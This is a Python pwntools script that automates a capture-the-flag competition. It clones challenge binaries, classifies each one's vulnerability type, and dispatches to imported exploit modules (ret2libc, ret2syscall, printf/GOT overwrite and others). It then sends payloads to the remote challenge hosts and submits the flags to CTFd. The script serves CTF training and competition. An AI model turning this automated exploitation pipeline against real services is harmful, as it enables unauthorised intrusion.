from pwn import *
import subprocess
import requests
import os
import json
import re
import detection
import got_overwrite
import printf_read
import re2win
import ret2system
import ROPparam
import angrwritegadget
import ret2execve
import ret2libc
import arrayabuse
import printf_write
import bonus
import ret2win2
import ret2one
import ret2syscall

# This helps debugging to shutup pwntools
# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

# Access token for team to make api calls
access_token = open('ctfd_access_token', 'r').read().strip()

# URL of ctfd --
ctfd_url = "https://ace.ctfd.io"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

# Regex to help find flags in recvall
flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #

def exploit(binary, chal_id): # ADD chal_id BACK FOR COMP

    print(binary)
    exploit_type = detection.scan(binary)
    print(exploit_type)

    if exploit_type == 'ret2win or rop parameters':
        print('[+] Vurp detected re2win or rop parameters')
        flag = ret2win2.exploit(binary,False,1)
        if flag:
            print(f'[!] flag for re2win/rop = {flag}')
            if flag != None:
                return flag
        else:
            flag = ROPparam.exploit(binary,False,1)
            print(f'[!] flag for re2win/rop = {flag}')
            if flag != None:
                return flag
            flag = ret2libc.exploit(binary)
            print(f'[!] flag for ret2one = {flag}')
            if flag != None:
                return flag
    elif exploit_type == 'ret2system':
        flag = ret2system.exploit(binary)
        print(f'[!] ret2system = {flag}')
        if flag != None:
            return flag
        flag = ret2libc.exploit(binary)
        print(f'[!] flag for ret2one = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'write gadget':
        flag = angrwritegadget.exploit(binary,False, 1)
        print(f'[!] flag for write_gadget = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'ret2execve':
        flag = ret2execve.exploit(binary)
        print(f'[!] flag for ret2execve = {flag}')
        if flag != None:
            return flag
        flag = ret2libc.exploit(binary)
        print(f'[!] flag for ret2one = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'ret2one':
        flag = ret2libc.exploit(binary)
        print(f'[!] flag for ret2one = {flag}')
        if flag != None:
            return flag
        flag = ret2one.exploit(binary)
        print(f'[!] flag for ret2one = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'ret2syscall':
        flag = ret2libc.exploit(binary)
        print(f'[!] flag for ret2syscall = {flag}')
        if flag != None:
            return flag
        flag = ret2syscall.exploit(binary)
        print(f'[!] flag for ret2syscall = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'arrayAbuse':
        flag = arrayabuse.exploit(binary)
        print(f'[!] flag for arrayindexabuse = {flag}')
        if flag != None:
            return flag
    elif exploit_type == 'printf':
        print('[!] VURP detects prinf')

        try:
            flag = printf_write.exploit(binary)
            print(f'[!] flag for printf_write = {flag}')
            if flag != None:
                return flag
        except:
            print('[!] not printf_write')

        try:
            flag = got_overwrite.exploit(binary)
            print(f'[!] flag for got_overwrite = {flag}')
            if flag != None:
                return flag
        except:
            print('[!] not printf_gyat')

        try:
            flag = printf_read.exploit(binary)
            print(f'[!] flag for printf_read = {flag}')
            if flag != None:
                return flag
        except Exception as e:
            print(f'[!] not printf_read {e}')

    elif exploit_type == 'unknown':
        try:
            flag = arrayabuse.exploit(binary)
            print(f'[!] flag for arrayindexabuse = {flag}')
            if flag != None:
                return flag
        except:
            print('[!] Boowomp')

        try:
            flag = bonus.exploit(binary)
            print(f'[!] flag for bonus = {flag}')
            if flag != None:
                return flag
        except:
            print('[!] Ionno')
        print('[!] Unknown to VURP')
    print("Nothing here yet\n")


# ------------------------------------------------- #
# This function will send the payload to the remote #
# service running on that address and port          #
# ------------------------------------------------- #

def send_exploit(binary, payload, chal_id):
    url = f"ace-service-{binary}.chals.io"
    p = remote(url, 443, ssl=True, sni=url)
    p.recvuntil(">>>\n")     # Should all be the same (this will be clarified)
    p.sendline(payload)
    p.recvline()
    flag = re.findall(flag_pattern, p.recvall(timeout=0.2).decode())
    if flag:
        send_flag(flag, chal_id)
    else:
        # This comment is for Chandler <3
        print("Remote Exploit didn't work!")

# ------------------------------------------------- #
# This function will submit the flag to CTFd        #
# ------------------------------------------------- #

def send_flag(flag, chal_id):
    challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
    data = json.dumps({"challenge_id" : chal_id, "submission" : flag})
    response = requests.post(challenge_url, headers=headers, data=data)


def motd():
    print("                                                 ")
    print("                                     ,-.----.    ")
    print("                          ,-.----.   \\    /  \\   ")
    print("       ,---.         ,--, \\    /  \\  |   :    \\  ")
    print("      /__./|       ,'_ /| ;   :    \\ |   |  .\\ : ")
    print(" ,---.;  ; |  .--. |  | : |   | .\\ : .   :  |: | ")
    print("/___/ \\  | |,'_ /| :  . | .   : |: | |   |   \\ : ")
    print("\\   ;  \\ ' ||  ' | |  . . |   |  \\ : |   : .   / ")
    print(" \\   \\  \\: ||  | ' |  | | |   : .  / ;   | |`-'  ")
    print("  ;   \\  ' .:  | | :  ' ; ;   | |  \\ |   | ;     ")
    print("   \\   \\   '|  ; ' |  | ' |   | ;\\  \\:   ' |     ")
    print("    \\   `  ;:  | : ;  ; | :   ' | \\.':   : :     ")
    print("     :   \\ |'  :  `--'   \\:   : :-'  |   | :     ")
    print("      '---\" :  ,      .-./|   |.'    `---'.|     ")
    print("             `--`----'    `---'        `---`     ")
    print("                                                 ")


# ------------------------------------------------- #
#                      MAIN                         #
# ------------------------------------------------- #

if __name__ == "__main__":
    motd()

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/tj-oconnor/ace-binaries.git", shell=True)
            os.rename("libc.so.6", "ace-binaries/final-binaries/libc.so.6")
            os.rename("flag.txt", "ace-binaries/final-binaries/flag.txt")
            os.chdir("ace-binaries/final-binaries") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #


    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    # ----- Main Execution Loop! ----- #
    flags = []
    #print(os.listdir())
    #e = ELF("bin-56")
    #p = process(e.path)
    for binary in os.listdir():
        if ".txt" not in binary and ".py" not in binary and ".gdb" not in binary:
            if "_patched" not in binary:
                subprocess.run(f"pwninit --bin {binary} --libc /opt/libc.so.6 --ld /opt/ld-2.27.so --no-template && mv {binary}_patched {binary}", shell=True, stdout=PIPE, stderr=PIPE)
            corrected = binary.replace("_", "-")
            #os.system(target=execute, args=(binary, challenge_list[corrected])))
    
    for binary in os.listdir():
        
        try:
            if binary != "flag.txt":
                # Call exploit with id of each challenge to submit flag
                flag = exploit(binary, challenge_list[binary])
                if flag is not None:
                    send_flag(flag, challenge_list[binary])
                #flag = exploit(binary)
                flags.append(f"{binary} : {flag}")
        except Exception as e:
            print(f"Failed to exploit {binary}: {e}")
    # -------------------------------- #
    for each in flags:
        print(each)
    print("Exploitation Complete!")

# try:
#     if binary != "flag.txt":
#         # Call exploit with id of each challenge to submit flag
#
#         exploit(binary, challenge_list[binary])
#
# except Exception as e:
#     print(f"Failed to exploit {binary}: {e}")